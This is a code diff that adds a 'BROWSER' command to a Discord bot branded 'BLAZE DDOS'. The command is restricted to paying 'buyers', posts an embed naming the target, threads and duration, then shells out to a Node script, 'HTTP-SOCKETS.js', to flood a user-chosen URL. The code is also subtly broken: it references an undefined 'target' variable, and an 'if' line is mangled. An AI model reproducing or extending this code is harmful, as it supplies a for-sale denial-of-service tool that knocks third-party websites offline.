@@ -360,6 +360,55 @@ async def DDOS(ctx, url, time):
 		
 		
 		
+@bot.command()
+
+async def BROWSER(ctx, url, threads, time):
+
+	if ctx.author.id not in buyers:		embedc = discord.Embed(title="🚀 **BLAZE DDOS** 🚀", color=0xfcb103)
+
+		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
+
+		embedc.set_footer(text=f"© Owner : DiozYzz#3514 | Warning {ctx.author.name}")
+
+		await ctx.reply(embed=embedc)
+
+	else:
+
+		embed = discord.Embed(title="🚀 **BLAZE DDOS** 🚀", color=discord.Colour.random())
+
+		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
+
+		embed.add_field(name="**Target**", value=f"`{target}`")
+
+		embed.add_field(name="**Methods**", value="`BROWSER`")
+
+		embed.add_field(name="**Threads**", value=f"`{threads}`")
+		
+		
+	
+		embed.add_field(name="**Duration**", value=f"`{time}`")
+
+		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
+
+		rdma1 = random.choice(ma1)
+
+		embed.set_image(url=rdma1)
+
+		embed.set_footer(text=f"© Owner : DiozYzz#3514 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
+
+		
+
+		
+
+		await ctx.send(embed=embed)
+
+		
+
+		os.system(f"node HTTP-SOCKETS.js {target} {threads} {time}")
+		
+		
+		
+		
 		
 @bot.command()
 async def UAM(ctx, url, thread, time, mthd):
